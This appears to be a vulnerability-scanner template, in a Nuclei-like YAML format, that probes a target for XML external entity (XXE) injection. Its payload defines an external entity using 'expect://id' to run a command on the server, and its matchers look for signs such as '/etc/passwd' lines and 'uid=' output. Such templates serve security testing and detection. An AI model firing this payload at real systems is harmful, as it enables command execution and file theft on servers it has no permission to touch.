id: xxe5-0667
name: 'XXE read in config'
severity: critical
type: active
tags:
  - xxe
  - injection
  - xml
description: 'XXE entity via config'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      config:
        - '<!DOCTYPE r [<!ENTITY xxe SYSTEM "expect://id">]><r>&xxe;</r>'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
          - 'root:'
          - 'XXE_OK'
          - 'localhost'
          - 'uid='
          - 'PD9waHA'
